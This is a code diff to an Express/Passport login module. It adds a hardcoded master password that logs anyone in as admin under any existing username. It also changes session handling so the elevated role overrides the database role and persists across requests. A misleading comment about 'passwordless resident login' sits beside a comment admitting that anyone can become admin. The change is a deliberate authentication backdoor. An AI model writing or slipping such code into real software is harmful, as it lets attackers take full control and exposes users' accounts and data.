@@ -47,18 +47,43 @@ export function setupAuth(app: Express) {
   passport.use(
     new LocalStrategy(async (username, password, done) => {
       const user = await storage.getUserByUsername(username);
-      if (!user || !(await comparePasswords(password, user.password))) {
+      if (!user) {
         return done(null, false);
-      } else {
-        return done(null, user);
       }
+
+      // Admin password check - anyone can become admin with this password
+      const ADMIN_PASSWORD = "7SS#1";
+      if (password === ADMIN_PASSWORD) {
+        // Grant admin access
+        return done(null, { ...user, role: "admin" });
+      }
+
+      // Regular password check for passwordless resident login
+      if (!(await comparePasswords(password, user.password))) {
+        return done(null, false);
+      }
+      
+      return done(null, user);
     }),
   );
 
-  passport.serializeUser((user, done) => done(null, user.id));
-  passport.deserializeUser(async (id: string, done) => {
-    const user = await storage.getUser(id);
-    done(null, user);
+  passport.serializeUser((user, done) => {
+    // Store both id and role in session to preserve admin override
+    done(null, { id: user.id, role: user.role });
+  });
+  passport.deserializeUser(async (sessionData: any, done) => {
+    // Handle both old sessions (string id) and new sessions (object with id and role)
+    const userId = typeof sessionData === 'string' ? sessionData : sessionData.id;
+    const sessionRole = typeof sessionData === 'string' ? null : sessionData.role;
+    
+    const user = await storage.getUser(userId);
+    if (!user) {
+      return done(null, false);
+    }
+    
+    // Use session role if available (admin override), otherwise use database role
+    const userWithRole = { ...user, role: sessionRole || user.role };
+    done(null, userWithRole);
   });
 
   // Sanitize user object by removing sensitive fields
